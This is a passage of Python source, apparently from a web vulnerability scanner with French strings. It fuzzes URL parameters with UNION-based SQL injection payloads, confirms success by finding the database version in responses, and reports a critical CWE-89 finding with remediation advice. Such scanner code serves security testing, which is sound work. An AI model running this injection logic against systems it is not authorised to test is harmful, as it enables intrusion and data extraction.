            r"(?:\d+\.\d+\.\d+[\w\-]*|MariaDB|MySQL|PostgreSQL|Microsoft SQL|Oracle)",
            re.I,
        )

        for payload, desc in union_payloads[:3]:
            fuzzed = {**params, param: [f"{orig_value}{payload}"]}
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            resp = await self._req.get(fuzz_url)
            if resp.error:
                continue

            match = version_re.search(resp.body or "")
            if match and not version_re.search(baseline.body or ""):
                db_version = match.group(0)
                # re-probe pour confirmer
                resp2 = await self.re_probe(fuzz_url, delay_s=0.3)
                if resp2 and version_re.search(resp2.body or ""):
                    yield Finding(
                        title=f"SQLi UNION-based — {col_count} colonnes, DB version extraite",
                        severity=Severity.CRITICAL,
                        url=fuzz_url,
                        module="vulns/sqli",
                        description=(
                            f"SQLi UNION confirmée : {col_count} colonnes. "
                            f"SGBD version: {db_version!r}. "
                            "Base de données lisible directement."
                        ),
                        evidence=(
                            f"Colonnes: {col_count} | Version: {db_version} | "
                            f"Payload: {payload[:80]}"
                        ),
                        cwe="CWE-89",
                        remediation="Utiliser des requêtes préparées. Valider et typer strictement les entrées.",
                    )
                    self._record_success(param, payload, fuzz_url, "union")
                    return


    @staticmethod
    def _detect_error(body: str) -> str | None:
        for pattern, dbms in SQL_ERROR_PATTERNS:
            if pattern.search(body):
                return dbms
        return None
